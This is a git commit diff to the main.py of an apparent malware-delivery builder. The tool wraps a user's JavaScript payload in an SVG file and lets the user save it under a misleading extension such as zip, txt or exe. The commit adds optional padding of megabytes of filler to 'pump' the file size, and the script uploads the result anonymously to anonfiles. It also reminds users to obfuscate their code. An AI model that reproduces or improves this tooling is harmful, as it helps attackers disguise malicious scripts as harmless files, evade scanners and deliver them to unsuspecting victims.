81acef4efe6aaf3717fc87be6c4785612777889b
K.Dot <110929758+KDot227@users.noreply.github.com>
2023-02-01 16:53:13 -0600

    Update main.py

--- main.py
+++ main.py
@@ -15,30 +15,41 @@ SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
 </svg>
 """
 
-def main():
-    js_code = input("Where is your file path to the JavaScript payload file? -> ")
-    name = input("What do you want to name the file? -> ")
-    filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
-    try:
-        with open(js_code, "r") as f:
-            js_code = f.read()
-            js_code = '\t\t'.join(js_code.splitlines())
+
+class main:
+    def __init__(self) -> None:
+        self.js_code = input("Where is your file path to the JavaScript payload file? -> ")
+        self.name = input("What do you want to name the file? -> ")
+        self.filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
+        pump = input("Would you like to pump the file for more size? (y/n) -> ")
+        if pump.lower() == "y":
+            self.pump = input("How many MB would you like to pump the file? -> ")
+        else:
+            self.pump = False
+        self.main()
         
-    except FileNotFoundError:
-        print("File not found")
-        time.sleep(3)
-        exit()
-    svg = SVG.replace("%code%", js_code)
-    svg_bytes = svg.encode("utf-8")
-    try:
-        r = requests.post("https://api.anonfiles.com/upload", files={"file": (f"{name}.{filetype}", svg_bytes)})
-    except Exception as e:
-        print(f"[-] {e}")
-        time.sleep(3)
-        exit()
-    url = r.json()["data"]["file"]["url"]["full"]
-    print(url)
+    def main(self):
+        print("Please remember to Obfuscate your JavaScript code before using this tool.")
+        try:
+            with open(self.js_code, "r") as f:
+                js_code = f.read()
+                js_code = '\t\t'.join(js_code.splitlines())
+        except FileNotFoundError:
+            print("File not found")
+            time.sleep(3)
+            exit()
+            
+        extra_chars = "A" * (1024 * 1024 * int(self.pump))
+        svg = SVG.replace("%code%", js_code) + extra_chars
+        svg_bytes = svg.encode("utf-8")
+        try:
+            r = requests.post("https://api.anonfiles.com/upload", files={"file": (f"{self.name}.{self.filetype}", svg_bytes)})
+        except Exception as e:
+            print(f"[-] {e}")
+            time.sleep(3)
+            exit()
+        url = r.json()["data"]["file"]["url"]["full"]
+        print(url)
 
 if __name__ == '__main__':
     main()
-    input("Press enter to exit")
